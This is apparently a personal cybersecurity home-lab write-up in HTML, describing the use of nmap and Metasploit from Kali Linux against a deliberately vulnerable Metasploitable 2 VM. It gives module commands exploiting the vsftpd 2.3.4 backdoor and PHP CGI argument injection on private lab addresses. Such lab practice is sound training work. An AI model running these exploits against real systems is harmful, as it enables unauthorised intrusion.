<h1>Metasploit Cybersecurity Home Lab</h1>

<h2>Description</h2>
<p>In this lab, I set up and configured Metasploit to exploit vulnerabilities in a virtual environment using VirtualBox and Kali Linux. This setup simulates various attack vectors</p>

<h2>Environments Used</h2>
<ul>
    <li><b>Host Operating System</b>: Windows 11</li>
    <li><b>Virtual Machines</b>:
        <ul>
            <li>Metasploitable 2</li>
            <li>Kali Linux</li>
        </ul>
    </li>
</ul>

<h2>Lab Walk-through</h2>

<h3>Setting Up the Environment</h3>
<ol>
    <li><b>Downloading Metasploitable 2</b>: Obtain the Metasploitable 2 virtual machine.</li>
    <li><b>Setting Up Virtual Machines</b>: Import the Metasploitable 2 virtual machine into VirtualBox.</li>
</ol>

<h3>Configuring VirtualBox VM</h3>
<p>Once imported, configure the network settings of both Kali Linux and Metasploitable 2 to be on the same internal network, ensuring they can communicate with each other.</p>

<h3>Nmap Scanning</h3>
<p>I used Nmap to scan the target machine (Metasploitable 2) for open ports and services. This helps in identifying potential vulnerabilities that can be exploited.</p>

<pre><code>sudo nmap -sV -O 10.0.2.4</code></pre>

<p align="center">
    <img src="img/Screenshot 2024-06-24 184306.png">


<h3>Launching Metasploit on Kali Linux</h3>
<ol>
    <li><b>Starting Metasploit Console</b>:</li>
</ol>

<pre><code>msfconsole</code></pre>

<p align="center">
    <img src="img/Screenshot 2024-06-24 185156.png"/>
</p>

<h3>Exploiting Vulnerabilities</h3>

<ol>
    <li><b>Using vsftpd 2.3.4 Backdoor</b>:</li>
</ol>

<pre><code>
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.2.4
exploit
</code></pre>

<p align="center">
    <img src="img/Screenshot 2024-06-24 185515.png"/>
<p align="center">
    <img src="img/Screenshot 2024-06-24 185530.png"/>
</p>

<ol start="2">
    <li><b>Directory Scanning and PHP CGI Argument Injection</b>:</li>
</ol>

<pre><code>
use auxiliary/scanner/http/dir_scanner
set RHOSTS 10.0.2.4
exploit

use exploit/multi/http/php_cgi_arg_injection
set RHOSTS 10.0.2.4
set LHOST 10.0.2.5
exploit
</code></pre>

<p align="center">
    <img src="img/Screenshot 2024-06-24 190945.png"/>
</p>

<h2>Additional Steps</h2>
<ul>
    <li><b>Enumerating Services and Vulnerabilities</b>: Use Metasploit's auxiliary modules to scan and identify services running on the target.</li>
    <li><b>Post-exploitation</b>: Gather information and maintain access on the compromised system.</li>
</ul>

</body>
</html>
<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
-->
